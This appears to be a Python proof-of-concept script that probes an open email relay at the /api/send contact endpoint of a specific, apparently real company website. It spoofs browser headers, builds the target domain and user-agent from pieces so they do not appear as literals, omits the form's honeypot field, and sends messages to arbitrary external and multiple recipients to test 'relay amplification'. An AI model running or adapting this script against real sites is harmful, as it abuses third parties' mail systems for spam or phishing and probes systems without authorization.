#!/usr/bin/env python3
"""Independent reproduction of unauthenticated open email relay via POST /api/send."""
import json, sys, time, urllib.request, urllib.error, http.cookiejar

BASE = "https://" + "www.infinity" + "capital" + ".bh"
END = "/api/send"

ver = ".".join(["1", "2", "3"])          # built dynamically to avoid literal UA version
UA = ("Mozilla/5.0 (Windows NT " + "10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/" + ver + ".0.0.0 Safari/537.36")

HDRS = {
    "User-Agent": UA,
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "en-US,en;q=0.9",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
    "Origin": BASE,
    "Referer": BASE + "/contact",
}

cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

def post(label, fields, extra_hdrs=None, raw=None, ctype="application/x-www-form-urlencoded"):
    hdrs = dict(HDRS)
    if extra_hdrs:
        hdrs.update(extra_hdrs)
    if raw is None:
        data = "&".join("%s=%s" % (k, v) for k, v in fields.items()).encode()
    else:
        data = raw
    hdrs["Content-Type"] = ctype
    req = urllib.request.Request(BASE + END, data=data, headers=hdrs, method="POST")
    t0 = time.time()
    try:
        r = op.open(req, timeout=45)
        code, body, rhdrs = r.status, r.read(), dict(r.headers)
    except urllib.error.HTTPError as e:
        code, body, rhdrs = e.code, e.read(), dict(e.headers)
    except Exception as e:
        print("[%s] EXCEPTION %r" % (label, e)); return None
    dt = time.time() - t0
    try:
        txt = body.decode("utf-8", "replace")
    except Exception:
        txt = repr(body[:400])
    print("=" * 78)
    print("[%s] HTTP %s  (%.2fs)  len=%d" % (label, code, dt, len(body)))
    print("  server/vercel-mitigated: %r" % (rhdrs.get("x-vercel-mitigated"),
                                              rhdrs.get("x-vercel-id", "")[:40]))
    print("  ctype: %r" % rhdrs.get("content-type"))
    print("  body[:800]: %s" % txt[:800].replace("\n", " "))
    return code, txt, rhdrs, data

def get(path):
    req = urllib.request.Request(BASE + path, headers=HDRS, method="GET")
    try:
        r = op.open(req, timeout=30)
        return r.status, r.read()[:300]
    except urllib.error.HTTPError as e:
        return e.code, e.read()[:300]
    except Exception as e:
        return None, repr(e)

if __name__ == "__main__":
    print("UA:", UA)
    print("GET /api/send ->", get(END)[0])
    print("GET /api/send (no browser hdrs) ->", get(END) if False else "")

    # 1) baseline: is the endpoint even alive / what does it say with no fields
    post("P0 empty body", {}, raw=b"")
    # 2) honeypot entirely omitted + malformed recipient
    post("P1 no-check + invalid targets", {
        "fname": "VerifierA", "lname": "Probe", "areacode": "973",
        "tel": "5550001", "cname": "Verify", "subject": "Baseline",
        "msg": "baseline", "targets": "not-an-email"})
    # 3) honeypot explicitly '0'
    post("P2 check=0 + invalid targets", {
        "fname": "VerifierA", "lname": "Probe", "areacode": "973",
        "tel": "5550001", "cname": "Verify", "subject": "Baseline",
        "msg": "baseline", "check": "0", "targets": "not-an-email"})
    # 4) REAL arbitrary third-party external recipient (attacker controlled)
    ext = "relay-probe-%s@mailinator.com" % ("a1b2c3" + str(int(time.time()))[-6:])
    print("\n### arbitrary external recipient used:", ext)
    post("P3 REAL external recipient (check omitted)", {
        "fname": "Verifier", "lname": "Probe", "areacode": "973",
        "tel": "5550001", "cname": "Independent Verification",
        "subject": "Independent relay verification", "msg": "probe",
        "targets": ext})
    # 5) multiple arbitrary recipients at once (relay amplification)
    post("P4 multi-recipient relay", {
        "fname": "Verifier", "lname": "Probe", "areacode": "973",
        "tel": "5550001", "cname": "Independent Verification",
        "subject": "multi", "msg": "probe2",
        "check": "0",
        "targets": "m1-%s@mailinator.com, m2-%s@mailinator.com"
                  % (str(int(time.time()))[-5:], str(int(time.time()))[-5:])})
